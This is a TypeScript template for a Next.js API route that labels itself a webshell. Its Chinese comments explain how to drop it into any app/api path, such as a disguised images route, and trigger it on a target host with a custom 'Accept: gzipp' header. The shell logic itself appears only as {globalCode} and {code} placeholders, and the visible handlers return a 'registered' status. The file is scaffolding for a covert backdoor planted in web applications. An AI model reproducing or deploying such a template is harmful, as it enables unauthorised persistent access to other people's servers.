// Next.js API Route - Webshell
// 部署方式：将此文件放到 app/api/[任意名称]/route.ts
// 例如：app/api/images/route.ts
// 访问：http://target.com/api/images （任意路径都可以，只需 Accept: gzipp header）

import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

{globalCode}

// 导出 Next.js API Route 处理函数（备用，主要通过 HTTP Server 劫持）
export async function POST(request: NextRequest) {
  return NextResponse.json(
    { status: 'registered', header: 'Accept: gzipp' },
    { status: 200 }
  );
}

export async function GET(request: NextRequest) {
  return NextResponse.json(
    { status: 'registered', header: 'Accept: gzipp' },
    { status: 200 }
  );
}

{code}
